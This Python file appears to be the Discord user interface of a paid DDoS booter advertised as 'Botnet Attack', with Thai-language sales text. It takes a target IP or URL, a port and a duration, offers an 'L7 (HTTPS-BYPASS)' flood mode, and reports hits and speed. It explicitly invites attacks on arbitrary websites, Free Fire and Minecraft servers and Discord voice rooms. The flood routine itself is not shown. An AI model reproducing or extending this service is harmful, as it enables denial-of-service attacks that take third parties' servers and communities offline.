# ui_v2.py
import discord
from discord import ui
from config import (
    EMOJI_HEADER, EMOJI_CONTACT, EMOJI_ALLOWED, EMOJI_BUTTON,
    PRICE_TEXT,
)


def build_panel() -> ui.LayoutView:
    view = ui.LayoutView(timeout=None)
    c = ui.Container()

    c.add_item(ui.TextDisplay(f"# {EMOJI_HEADER} **Botnet Attack**"))
    c.add_item(ui.TextDisplay(
        f"{EMOJI_CONTACT} **สนใจติดต่อ Tk มาเลยค้าบ {PRICE_TEXT}**"
    ))
    c.add_item(ui.Separator())
    c.add_item(ui.TextDisplay(
        f"**กฎการใช้**\n"
        f"ห้ามยิง Local IP `127.0.0.1` อย่างเดียวพออ"
    ))
    c.add_item(ui.Separator())
    c.add_item(ui.TextDisplay(
        f"{EMOJI_ALLOWED} **Ddos ได้**\n"
        f"เว็บอะไรก็ได้นอกจากเว็บต้องห้าม\n\n"
        f"เซิร์ฟ ฟีฟาย\n"
        f"เซิร์ฟ มายคราฟ\n"
        f"ห้องเสียงDiscord"
    ))
    c.add_item(ui.ActionRow().add_item(PanelButton()))
    view.add_item(c)
    return view


class PanelButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="",
            style=discord.ButtonStyle.secondary,
            custom_id="panel_request",
            emoji=EMOJI_BUTTON,
        )

    async def callback(self, interaction: discord.Interaction):
        from bot import open_attack_modal
        await open_attack_modal(interaction)


class AttackModal(ui.Modal, title="Botnet Attack"):
    target = ui.TextInput(
        label="Target IP / URL",
        placeholder="example.com หรือ 1.2.3.4",
        required=True, max_length=200,
    )
    port = ui.TextInput(
        label="Port",
        placeholder="65535",
        required=True, max_length=5,
    )
    duration = ui.TextInput(
        label="Time (max 350s)",
        placeholder="300",
        required=True, max_length=3,
    )

    async def on_submit(self, interaction: discord.Interaction):
        from bot import handle_attack_submit
        await handle_attack_submit(interaction, self)


def build_mode_select(user_id: int, target: str, port: int,
                      duration: int) -> ui.LayoutView:
    view = ui.LayoutView(timeout=300)
    c = ui.Container()

    c.add_item(ui.TextDisplay("# เลือกโหมดการยิง"))
    c.add_item(ui.TextDisplay(
        f"```\n"
        f"[+] Target : {target}\n"
        f"[+] Port   : {port}\n"
        f"[+] Time   : {duration}s\n"
        f"```"
    ))
    c.add_item(ui.ActionRow().add_item(
        ModeSelect(user_id, target, port, duration)
    ))
    view.add_item(c)
    return view


class ModeSelect(ui.Select):
    def __init__(self, user_id: int, target: str, port: int, duration: int):
        options = [
            discord.SelectOption(label="L7 (HTTPS-BYPASS)", value="l7", emoji="🌐"),
        ]
        super().__init__(placeholder="เลือกโหมด", options=options,
                         custom_id="mode_select")
        self.user_id = user_id
        self.target = target
        self.port = port
        self.duration = duration

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message(
                "ไม่ใช่คำสั่งของมึง", ephemeral=True
            )
            return
        from bot import start_attack
        await start_attack(interaction, self.values[0], self.target,
                           self.port, self.duration)


def build_attack_running(target: str, port: int, mode: str,
                         time_left: int, total: int,
                         speed: str, hits: int = 0) -> ui.LayoutView:
    view = ui.LayoutView(timeout=None)
    c = ui.Container()

    c.add_item(ui.TextDisplay("# Attack Launched Successfully"))
    c.add_item(ui.TextDisplay(
        f"```\n"
        f"[+] Target    : {target}\n"
        f"[+] Port      : {port}\n"
        f"[+] Method    : {mode}\n"
        f"[+] Time      : {time_left}s / {total}s\n"
        f"[+] Speed     : {speed}\n"
        f"[+] Hits      : {hits}\n"
        f"[+] Cooldown  : {'Running' if time_left > 0 else 'Ready'}\n"
        f"[+] Slot      : 0/1\n"
        f"```"
    ))
    view.add_item(c)
    return view